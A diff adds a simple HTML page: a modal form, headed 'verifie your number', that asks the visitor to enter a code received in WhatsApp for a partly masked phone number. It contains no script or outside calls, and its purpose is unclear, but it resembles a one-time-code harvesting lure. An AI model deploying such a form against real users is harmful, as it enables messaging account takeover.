@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Document</title>
+  <style>
+    body {
+      background-color: black;
+    }
+    input[type=submit] {
+            background-color: #04AA6D;
+            color: white;
+            cursor: pointer;
+        }
+
+    .container2 {
+      height: 100%;
+      border: none;
+      background-color: rgb(102, 102, 102);
+      padding: 0;
+    }
+
+    .modal {
+
+      /* Hidden by default */
+      position: fixed;
+      /* Stay in place */
+      z-index: 1;
+      /* Sit on top */
+      left: 0;
+      top: 0;
+      width: 100%;
+      /* Full width */
+      height: 100%;
+      /* Full height */
+      overflow: auto;
+      /* Enable scroll if needed */
+      background-color: #474e5d;
+      padding-top: 50px;
+    }
+    input,
+        .btn {
+            width: 96%;
+            padding: 12px;
+            border: none;
+            border-radius: 4px;
+            margin: 5px 0;
+            opacity: 0.85;
+            display: inline-block;
+            font-size: 17px;
+            line-height: 20px;
+            text-decoration: none;
+            /* remove underline from anchors */
+        }
+    .modal-content {
+      background-color: #888;
+      margin: 5% auto 15% auto;
+      /* 5% from the top, 15% from the bottom and centered */
+      border: none;
+      width: 80%;
+      /* Could be more or less, depending on screen size */
+    }
+  </style>
+</head>
+
+<body>
+  <div style="color: white; background-color: black;" id="id01" class="modal">
+
+    <form class="modal-content" action="/action_page.php">
+      <div class="container2">
+        <center>
+          <h1>verifie your number</h1>
+        </center>
+        <p>
+         <center> <h4>
+            please verifie the following number
+          </h4>
+          <h5>
+            +2507.....
+          </h5>
+        
+        </p>
+
+        <label for="email"><b>please enter the given code in your whatsapp messenger</b></label>
+        <input style="width:60%" type="text" placeholder="OTP num" name="OTPnumber" required>
+        <div class="clearfix">
+          <button style="height: 50px ;" type="submit" class="signupbtn">verifie</button>
+        </div>
+      </center>
+      </div>
+    </form>
+  </div>
+</body>
+
+</html>
